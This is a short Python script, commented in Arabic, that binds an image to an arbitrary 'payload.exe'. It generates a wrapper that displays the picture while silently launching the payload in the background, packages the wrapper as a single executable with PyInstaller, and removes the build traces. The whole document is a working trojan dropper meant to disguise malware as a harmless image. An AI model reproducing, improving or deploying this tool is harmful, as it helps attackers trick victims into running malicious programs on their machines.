import os
import sys
import shutil

# تعريف الملفات
image_file = "image.jpg"
payload_file = "payload.exe"
output_file = "output.exe"

# تحقق من وجود الملفات
if not os.path.exists(image_file):
    print(f"[!] لم يتم العثور على {image_file}")
    sys.exit(1)

if not os.path.exists(payload_file):
    print(f"[!] لم يتم العثور على {payload_file}")
    sys.exit(1)

# الدمج بين الصورة والبيلود داخل برنامج واحد
def create_exe():
    script_content = f'''
import os
import subprocess
from PIL import Image
import io

# عرض الصورة
image_path = "{image_file}"
img = Image.open(image_path)
img.show()

# تشغيل البيلود في الخلفية
payload_path = "{payload_file}"
subprocess.Popen(payload_path, shell=True)
'''

    # حفظ السكربت
    with open("payload_image_script.py", "w") as f:
        f.write(script_content)

    # استخدام PyInstaller لتحويل السكربت إلى EXE
    os.system("pyinstaller --onefile payload_image_script.py")

    # نقل EXE الناتج إلى المجلد النهائي
    shutil.move("dist/payload_image_script.exe", output_file)
    
    # تنظيف الملفات المؤقتة
    shutil.rmtree("build")
    shutil.rmtree("dist")
    os.remove("payload_image_script.py")
    
    print(f"[+] تم إنشاء {output_file} بنجاح!")

# إنشاؤه
create_exe()